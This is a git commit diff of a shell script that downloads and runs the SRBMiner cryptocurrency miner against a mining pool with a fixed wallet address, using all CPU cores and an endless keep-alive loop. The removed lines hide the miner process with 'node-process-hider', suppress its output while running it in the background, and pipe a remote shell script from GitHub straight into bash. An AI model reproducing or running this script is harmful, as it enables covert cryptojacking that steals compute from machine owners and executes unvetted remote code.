91d0fdb9ac8c3c8dc34c113908f4c1ed268cb8c2
malogrono <136266511+malogrono@users.noreply.github.com>
2025-01-01 06:34:53 +0700

    Update newsrb.sh

--- newsrb.sh
+++ newsrb.sh
@@ -1,9 +1,12 @@
 #!/bin/sh
 sudo apt update
 sudo apt install screen -y
-sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.4/SRBMiner-Multi-2-7-4-Linux.tar.gz >/dev/null 2>&1
-tar -xzvf SRBMiner-Multi-2-7-4-Linux.tar.gz
-cd SRBMiner-Multi-2-7-4
-./SRBMiner-MULTI --algorithm verushash --pool 188.166.219.152:443 --wallet RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6."PO$RANDOM" >/dev/null 2>&1 &
-curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
+wget https://github.com/doktor63/SRBMiner/releases/download/2.6.9/SRBMiner-Multi-2-6-9-Linux.tar.gz
+tar -xvf SRBMiner-Multi-2-6-9-Linux.tar.gz
+cd SRBMiner-Multi-2-6-9
+clear
+./SRBMiner-MULTI --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RJAkiJXQy8Q9PcBkEPTBypMJj7ofGgQjo6.flare $(echo $(shuf -i 1-9999 -n 1)-CPU) -t $(nproc --all)
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
